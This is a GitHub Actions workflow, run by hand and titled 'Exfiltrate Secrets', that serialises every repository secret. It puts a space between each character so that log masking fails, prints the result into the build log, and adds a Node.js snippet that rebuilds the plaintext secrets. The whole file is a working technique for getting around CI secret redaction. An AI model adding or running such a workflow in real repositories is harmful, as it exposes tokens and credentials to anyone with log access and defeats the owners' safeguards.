name: Exfiltrate Secrets (DANGER ZONE)

on:
  workflow_dispatch:

jobs:
  leak:
    runs-on: ubuntu-latest
    steps:
      - name: Generate spaced secret dump and recovery script
        run: |
          echo "ðŸ” Exfiltrating all secrets... (DO NOT COMMIT THIS)"
          echo ""

          spaced=$(echo '${{ toJSON(secrets) }}' | fold -w1 | tr '\n' ' ')
          
          echo 'âœ… Copy and paste this into a Node.js shell to recover the secrets:'
          echo ""
          echo "const spacedDump = '$spaced';"
          echo 'const json = spacedDump.split("").filter((_, i) => i % 2 === 0).join("");'
          echo 'console.log(JSON.parse(json));'
